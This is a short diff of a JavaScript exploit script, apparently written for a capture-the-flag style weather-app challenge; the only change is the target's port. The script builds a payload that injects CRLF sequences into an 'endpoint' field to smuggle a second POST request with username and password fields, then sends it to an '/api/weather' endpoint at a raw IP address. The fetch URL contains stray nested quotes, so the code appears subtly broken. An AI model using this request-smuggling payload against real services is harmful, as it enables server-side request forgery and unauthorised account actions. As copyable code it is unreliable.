@@ -22,7 +22,7 @@ async function makeRequest() {
     const payloadUrl = baseUrl + s + httpTag + rn + hostHeader + rn + rn + postReqTag + s + httpTag + rn + hostHeader + rn + contentTypeHeader + rn + contentLengthHeader + rn + rn + "username=" + username + "&password=" + password + rn + rn + "GET" + s;
     const postRequestPayload = JSON.stringify({ endpoint: payloadUrl, city: "Toronto", country: "CA" });
 
-    const result = await fetch('http://"http://142.93.32.153:30749/"/api/weather', {
+    const result = await fetch('http://"142.93.32.153:31117/"/api/weather', {
         method: 'POST',
         headers: {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
